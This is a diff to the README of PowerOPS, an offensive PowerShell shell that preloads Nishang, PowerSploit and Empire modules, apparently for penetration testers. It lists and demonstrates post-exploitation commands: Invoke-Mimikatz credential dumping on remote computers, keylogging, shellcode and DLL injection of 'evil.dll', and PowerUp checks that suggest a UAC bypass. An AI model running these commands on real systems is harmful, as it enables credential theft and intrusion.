@@ -66,15 +66,306 @@ PowerOPS uses the System.Management.Automation namespace, so make sure you have 
 
 ### How to use it:
 
-Just run the executables. PowerUp and PowerView are loaded as modules, so **Get-Command -module** will show you all available functions. **Get-Help** is your friend and will help to find how to use the modules. Some examples bellow.
+Just run the binary and type 'show' to list available modules.
 
 ```
-Get-command -module PowerView
-Get-Help Invoke-Mimikatz -examples
-Get-Help Invoke-DllInjection -full
+PS > show
+
+[-] This computer is not part of a Domain! Some functions will not work!
+
+[+] Nishang
+
+ Get-Information    Get-PassHashes             Port-Scan
+
+[+] PowerSploit
+
+ Get-KeyStrokes     Invoke-DllInjection        Invoke-Mimikatz     Invoke-NinjaCopy
+ Invoke-Shellcode   Invoke-TokenManipulation   Invoke-WmiCommand   Invoke-ReflectivePEInjection
+ PowerView          PowerUp
+
+[+] Empire
+
+ Invoke-PsExec      Invoke-SSHCommand
+
+[+] Others
+
+ Auto-GPPPassword   Get-ProductKey             PowerCat
+
+PS >
 ```
 
-All your PowerShell fu applies. PowerOPS is basically a PowerShell shell with some modules/functions pre-loaded. Have Fun!
+PowerUp and PowerView are loaded as modules, so **Get-Command -module** will show you all available functions.
+
+```
+PS > get-command -module powerup
+
+CommandType     Name                                               ModuleName
+-----------     ----                                               ----------
+Function        Find-DLLHijack                                     PowerUp
+Function        Find-PathHijack                                    PowerUp
+Function        Get-ApplicationHost                                PowerUp
+Function        Get-ModifiableFile                                 PowerUp
+Function        Get-RegAlwaysInstallElevated                       PowerUp
+Function        Get-RegAutoLogon                                   PowerUp
+Function        Get-ServiceDetail                                  PowerUp
+Function        Get-ServiceFilePermission                          PowerUp
+Function        Get-ServicePermission                              PowerUp
+Function        Get-ServiceUnquoted                                PowerUp
+Function        Get-UnattendedInstallFile                          PowerUp
+Function        Get-VulnAutoRun                                    PowerUp
+Function        Get-VulnSchTask                                    PowerUp
+Function        Get-Webconfig                                      PowerUp
+Function        Install-ServiceBinary                              PowerUp
+Function        Invoke-AllChecks                                   PowerUp
+Function        Invoke-ServiceAbuse                                PowerUp
+Function        Invoke-ServiceDisable                              PowerUp
+Function        Invoke-ServiceEnable                               PowerUp
+Function        Invoke-ServiceStart                                PowerUp
+Function        Invoke-ServiceStop                                 PowerUp
+Function        Restore-ServiceBinary                              PowerUp
+Function        Test-ServiceDaclPermission                         PowerUp
+Function        Write-HijackDll                                    PowerUp
+Function        Write-ServiceBinary                                PowerUp
+Function        Write-UserAddMSI                                   PowerUp
+
+PS >
+```
+
+Yes, all your PowerShell fu applies. PowerOPS is basically a PowerShell shell with some modules/functions pre-loaded. So **Get-Help** is your friend and will help to find how to use the modules.
+
+Let's say you want to see examples on how to use Invoke-Mimikatz.
+
+```
+PS > Get-Help Invoke-Mimikatz -examples
+
+NAME
+    Invoke-Mimikatz
+
+SYNOPSIS
+    This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to
+    reflectively load Mimikatz completely in memory. This allows you to do
+    things such as
+    dump credentials without ever writing the mimikatz binary to disk.
+    The script has a ComputerName parameter which allows it to be executed
+    against multiple computers.
+
+    This script should be able to dump credentials from any version of Windows
+    through Windows 8.1 that has PowerShell v2 or higher installed.
+
+    Function: Invoke-Mimikatz
+    Author: Joe Bialek, Twitter: @JosephBialek
+    Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog:
+    http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter
+    @gentilkiwi
+    License:  http://creativecommons.org/licenses/by/3.0/fr/
+    Required Dependencies: Mimikatz (included)
+    Optional Dependencies: None
+    Version: 1.5
+    ReflectivePEInjection version: 1.1
+    Mimikatz version: 2.0 alpha (2/16/2015)
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+    C:\PS>Execute mimikatz on the local computer to dump certificates.
+
+
+    Invoke-Mimikatz -DumpCerts
+
+
+    -------------------------- EXAMPLE 2 --------------------------
+
+    C:\PS>Execute mimikatz on two remote computers to dump credentials.
+
+
+    Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
+
+
+    -------------------------- EXAMPLE 3 --------------------------
+
+    C:\PS>Execute mimikatz on a remote computer with the custom command
+    "privilege::debug exit" which simply requests debug privilege and exits
+
+
+    Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
+
+
+PS >
+```
+
+Or simply look at the whole help available for Invoke-DllInjection.
+
+```
+PS > Get-Help Invoke-DllInjection -full
+
+NAME
+    Invoke-DllInjection
+
+SYNOPSIS
+    Injects a Dll into the process ID of your choosing.
+
+    PowerSploit Function: Invoke-DllInjection
+    Author: Matthew Graeber (@mattifestation)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+SYNTAX
+    Invoke-DllInjection [-ProcessID] <Int32> [-Dll] <String>
+    [<CommonParameters>]
+
+
+DESCRIPTION
+    Invoke-DllInjection injects a Dll into an arbitrary process.
+
+
+PARAMETERS
+    -ProcessID <Int32>
+        Process ID of the process you want to inject a Dll into.
+
+        Required?                    true
+        Position?                    1
+        Default value                0
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    -Dll <String>
+        Name of the dll to inject. This can be an absolute or relative path.
+
+        Required?                    true
+        Position?                    2
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    <CommonParameters>
+        This cmdlet supports the common parameters: Verbose, Debug,
+        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
+        OutBuffer, PipelineVariable, and OutVariable. For more information, see
+        about_CommonParameters (http://go.microsoft.com/fwlink/?LinkID=113216).
+
+INPUTS
+
+OUTPUTS
+
+NOTES
+        Use the '-Verbose' option to print detailed information.
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+    C:\PS>Invoke-DllInjection -ProcessID 4274 -Dll evil.dll
+
+
+    Description
+    -----------
+    Inject 'evil.dll' into process ID 4274.
+
+RELATED LINKS
+    http://www.exploit-monday.com
+
+PS >
+```
+
+You can play around with the output...
+
+```
+PS > get-productkey
+
+OSDescription        Computername        OSVersion           ProductKey
+-------------        ------------        ---------           ----------
+Microsoft Windows... VISUALSTUDIO        6.1.7601            ABCDE-54321-UVXY...
+
+
+
+PS > get-productkey | format-list
+
+
+OSDescription : Microsoft Windows 7 Professional N
+Computername  : VISUALSTUDIO
+OSVersion     : 6.1.7601
+ProductKey    : ABCDE-54321-UVXYZ-12345-LMNOP
+```
+
+Save the output of your commands the way you want...
+
+```
+PS > invoke-allchecks | Out-File -Encoding ascii powerup.output.txt
+
+PS > type powerup.output.txt
+
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+
+[*] Checking for unquoted service paths...
+
+[*] Checking service executable and argument permissions...
+
+[*] Checking service permissions...
+
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+[*] Checking for Autologon credentials in registry...
+
+[*] Checking for vulnerable registry autoruns and configs...
+
+[*] Checking for vulnerable schtask files/configs...
+
+[*] Checking for unattended install files...
+
+[*] Checking for encrypted web.config strings...
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+PS >
+```
+
+Do some math...
+
+```
+PS > $a=1
+
+PS > $b=4
+
+PS > $c=$a+$b
+
+PS > echo $c
+5
+```
+
+Browse the filesystem...
+
+```
+PS > cd c:\
+
+PS > ls
+
+    Directory: C:\
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----        14/02/2016     17:21            bin
+d----        17/02/2016     15:02            Dev-Cpp
+d----        14/07/2009     04:20            PerfLogs
+d-r--        26/04/2016     20:00            Program Files
+d-r--        26/04/2016     20:00            Program Files (x86)
+d----        19/02/2016     21:06            Python27
+d-r--        26/11/2015     17:20            Users
+d----        12/05/2016     15:53            Windows
+-a---        19/03/2010     23:55    2073703 VS_EXPBSLN_x64_enu.CAB
+-a---        19/03/2010     23:58     551424 VS_EXPBSLN_x64_enu.MSI
+
+PS > pwd
+
+Path
+----
+C:\
+
+PS >
+```
 
 ### Credits:
 
